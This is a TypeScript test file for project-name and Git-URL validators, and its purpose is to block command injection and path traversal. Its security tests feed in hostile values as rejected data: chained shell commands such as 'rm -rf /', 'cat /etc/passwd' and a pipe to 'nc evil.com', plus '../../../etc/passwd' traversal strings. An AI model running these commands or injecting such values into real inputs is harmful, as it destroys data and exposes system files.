import { describe, it, expect } from "vitest";

// Test the validation functions logic (mirrors projects.ts implementation)

function isValidProjectName(name: string): boolean {
  if (!name || name.length === 0 || name.length > 100) {
    return false;
  }
  if (!/^[a-zA-Z0-9_.-]+$/.test(name)) {
    return false;
  }
  if (name.includes("..") || name.startsWith(".") || name.startsWith("-")) {
    return false;
  }
  return true;
}

function isValidGitUrl(url: string): boolean {
  try {
    const parsed = new URL(url);
    if (parsed.protocol !== "https:") {
      return false;
    }
    const allowedHosts = ["github.com", "gitlab.com", "bitbucket.org"];
    if (!allowedHosts.includes(parsed.hostname)) {
      return false;
    }
    const pathParts = parsed.pathname.split("/").filter(Boolean);
    if (pathParts.length < 2 || pathParts.length > 3) {
      return false;
    }
    for (const part of pathParts) {
      const cleanPart = part.replace(/\.git$/, "");
      if (!/^[a-zA-Z0-9_.-]+$/.test(cleanPart)) {
        return false;
      }
    }
    return true;
  } catch {
    return false;
  }
}

describe("isValidProjectName", () => {
  describe("valid names", () => {
    it("should accept alphanumeric names", () => {
      expect(isValidProjectName("myproject")).toBe(true);
      expect(isValidProjectName("MyProject123")).toBe(true);
      expect(isValidProjectName("project")).toBe(true);
    });

    it("should accept names with dashes", () => {
      expect(isValidProjectName("my-project")).toBe(true);
      expect(isValidProjectName("my-awesome-project")).toBe(true);
    });

    it("should accept names with underscores", () => {
      expect(isValidProjectName("my_project")).toBe(true);
      expect(isValidProjectName("my_awesome_project")).toBe(true);
    });

    it("should accept names with dots (not at start)", () => {
      expect(isValidProjectName("project.js")).toBe(true);
      expect(isValidProjectName("my.project.name")).toBe(true);
    });
  });

  describe("invalid names", () => {
    it("should reject empty strings", () => {
      expect(isValidProjectName("")).toBe(false);
    });

    it("should reject names starting with dots", () => {
      expect(isValidProjectName(".hidden")).toBe(false);
      expect(isValidProjectName(".git")).toBe(false);
    });

    it("should reject names starting with dashes", () => {
      expect(isValidProjectName("-project")).toBe(false);
    });

    it("should reject names with path traversal", () => {
      expect(isValidProjectName("..")).toBe(false);
      expect(isValidProjectName("project/../etc")).toBe(false);
      expect(isValidProjectName("project..name")).toBe(false);
    });

    it("should reject names with special characters", () => {
      expect(isValidProjectName("project/name")).toBe(false);
      expect(isValidProjectName("project\\name")).toBe(false);
      expect(isValidProjectName("project name")).toBe(false);
      expect(isValidProjectName("project;name")).toBe(false);
      expect(isValidProjectName("project|name")).toBe(false);
      expect(isValidProjectName("project&name")).toBe(false);
      expect(isValidProjectName("project`name")).toBe(false);
      expect(isValidProjectName("project$(cmd)")).toBe(false);
    });

    it("should reject very long names", () => {
      const longName = "a".repeat(101);
      expect(isValidProjectName(longName)).toBe(false);
    });
  });
});

describe("isValidGitUrl", () => {
  describe("valid URLs", () => {
    it("should accept GitHub HTTPS URLs", () => {
      expect(isValidGitUrl("https://github.com/user/repo")).toBe(true);
      expect(isValidGitUrl("https://github.com/user/repo.git")).toBe(true);
      expect(isValidGitUrl("https://github.com/organization/my-project")).toBe(true);
    });

    it("should accept GitLab HTTPS URLs", () => {
      expect(isValidGitUrl("https://gitlab.com/user/repo")).toBe(true);
      expect(isValidGitUrl("https://gitlab.com/group/subgroup/repo")).toBe(true);
    });

    it("should accept Bitbucket HTTPS URLs", () => {
      expect(isValidGitUrl("https://bitbucket.org/user/repo")).toBe(true);
    });
  });

  describe("invalid URLs", () => {
    it("should reject HTTP URLs (non-HTTPS)", () => {
      expect(isValidGitUrl("http://github.com/user/repo")).toBe(false);
    });

    it("should reject SSH URLs", () => {
      expect(isValidGitUrl("git@github.com:user/repo.git")).toBe(false);
    });

    it("should reject non-allowed hosts", () => {
      expect(isValidGitUrl("https://example.com/user/repo")).toBe(false);
      expect(isValidGitUrl("https://evil.com/user/repo")).toBe(false);
      expect(isValidGitUrl("https://notgithub.com/user/repo")).toBe(false);
    });

    it("should reject invalid path formats", () => {
      expect(isValidGitUrl("https://github.com/")).toBe(false);
      expect(isValidGitUrl("https://github.com/user")).toBe(false);
      expect(isValidGitUrl("https://github.com/a/b/c/d")).toBe(false);
    });

    it("should reject URLs with special characters in path", () => {
      expect(isValidGitUrl("https://github.com/user/repo;cmd")).toBe(false);
      expect(isValidGitUrl("https://github.com/user/repo|cmd")).toBe(false);
      expect(isValidGitUrl("https://github.com/user/repo$(cmd)")).toBe(false);
    });

    it("should reject invalid URLs", () => {
      expect(isValidGitUrl("not-a-url")).toBe(false);
      expect(isValidGitUrl("")).toBe(false);
      expect(isValidGitUrl("ftp://github.com/user/repo")).toBe(false);
    });
  });
});

describe("Security scenarios", () => {
  it("should prevent command injection via project name", () => {
    // These should all be rejected to prevent shell injection
    expect(isValidProjectName("test; rm -rf /")).toBe(false);
    expect(isValidProjectName("test && cat /etc/passwd")).toBe(false);
    expect(isValidProjectName("test | nc evil.com 1234")).toBe(false);
    expect(isValidProjectName("`whoami`")).toBe(false);
    expect(isValidProjectName("$(whoami)")).toBe(false);
  });

  it("should prevent path traversal via project name", () => {
    expect(isValidProjectName("../../../etc/passwd")).toBe(false);
    expect(isValidProjectName("..")).toBe(false);
    expect(isValidProjectName("test/../../etc")).toBe(false);
  });

  it("should prevent URL injection attacks", () => {
    // Attacker-controlled URLs should be rejected
    expect(isValidGitUrl("https://evil.com/malicious/payload")).toBe(false);
    expect(isValidGitUrl("https://github.com.evil.com/user/repo")).toBe(false);
  });
});
